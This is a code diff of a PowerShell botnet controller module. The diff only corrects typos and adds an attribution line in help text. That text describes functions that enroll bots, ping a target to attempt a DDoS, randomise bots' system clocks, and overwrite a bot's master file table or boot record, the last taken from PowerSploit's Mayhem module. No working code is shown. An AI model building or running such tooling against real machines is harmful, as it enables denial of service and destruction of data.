@@ -7,8 +7,8 @@ function Initialize-Master{
 This is command Initalizes the local host to act as a Master for the botnet
 
 .DESCRIPTION
-Performs task thst allow the local host to send commands to bot
-    Starts by adding user, used by bots to write to host file
+Performs tasks that allow the local host to send commands to bots
+    Starts by adding a user that is used by bots to write to the bot list file
     modifies all networks to be set to private which is required foir remoting
     Creates CSV file "botlist" for storing bots
     Enable the services for remote PowerShell commands
@@ -243,7 +243,7 @@ function Test-DDOSTarget{
 uses all bots to ping a specified target to attempt a DDoS
 
 .DESCRIPTION
-Goes down the botlist.csv file tests tests the bot
+Goes down the botlist.csv file  tests the bot
 then the bot pings the target ip address
 the hope is that with enough host a DDoS would occur
 
@@ -333,7 +333,7 @@ function Set-AllRandomTime{
 Sets all bots' system time to a random time
 
 .DESCRIPTION
-goes through the botlist csv file and passes each bots ip address to Set-Randtime
+Goes through the botlist csv file and passes each bots ip address to Set-Randtime
 
 .EXAMPLE
    Set-AllRandomTime 
@@ -429,7 +429,7 @@ To overwrite the master file table of the specified bot
 the bot is then removed from the botlist.csv file
 
 .EXAMPLE
-   Remove-BOt <Target IP Address>
+   Remove-Bot <Target IP Address>
 
 #>
  
@@ -503,6 +503,7 @@ then the botlist.csv is removed and the Master module is removed
 
 
 #Taken from Powersploit's Mayhem module, a POC that shows that powershell can modify the MFT
+#Please see the PowerSploit GitHub for more info https://github.com/PowerShellMafia/PowerSploit
 function Set-MasterBootRecord{
 <#
 .SYNOPSIS
